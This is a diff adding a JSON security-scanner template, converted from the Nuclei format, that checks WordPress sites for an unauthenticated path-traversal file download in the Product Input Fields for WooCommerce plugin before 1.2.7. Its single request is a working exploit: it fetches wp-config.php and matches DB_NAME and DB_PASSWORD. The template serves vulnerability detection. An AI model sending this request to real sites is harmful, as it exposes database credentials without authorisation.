@@ -1,0 +1,146 @@
+{
+  "id": "wp-woocommerce-file-download",
+  "name": "Product Input Fields for WooCommerce \u003c 1.2.7 - Unauthenticated File Download",
+  "author": "0x_Akoko",
+  "severity": "HIGH",
+  "description": "WordPress WooCommerce \u003c 1.2.7 is susceptible to file download vulnerabilities. The lack of authorization checks in the handle_downloads() function hooked to admin_init() could allow unauthenticated users to download arbitrary files from the blog using a path traversal payload.\n",
+  "references": [
+    "- https://wpscan.com/vulnerability/15f345e6-fc53-4bac-bc5a-de898181ea74\n- https://blog.nintechnet.com/high-severity-vulnerability-fixed-in-product-input-fields-for-woocommerce/\n"
+  ],
+  "tags": [
+    "wordpress",
+    "woocommerce",
+    "lfi",
+    "wp-plugin",
+    "wp"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-22",
+  "cvssScore": "8.6",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/wp-admin/admin-post.php?alg_wc_pif_download_file\u003d../../../../../wp-config.php",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "DB_NAME",
+            "DB_PASSWORD"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "wp-woocommerce-file-download",
+    "info": {
+      "name": "Product Input Fields for WooCommerce \u003c 1.2.7 - Unauthenticated File Download",
+      "author": "0x_Akoko",
+      "severity": "high",
+      "description": "WordPress WooCommerce \u003c 1.2.7 is susceptible to file download vulnerabilities. The lack of authorization checks in the handle_downloads() function hooked to admin_init() could allow unauthenticated users to download arbitrary files from the blog using a path traversal payload.\n",
+      "reference": "- https://wpscan.com/vulnerability/15f345e6-fc53-4bac-bc5a-de898181ea74\n- https://blog.nintechnet.com/high-severity-vulnerability-fixed-in-product-input-fields-for-woocommerce/\n",
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
+        "cvss_score": "8.6",
+        "cwe_id": "CWE-22"
+      },
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "wordpress,woocommerce,lfi,wp-plugin,wp"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/wp-admin/admin-post.php?alg_wc_pif_download_file\u003d../../../../../wp-config.php"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "DB_NAME",
+              "DB_PASSWORD"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
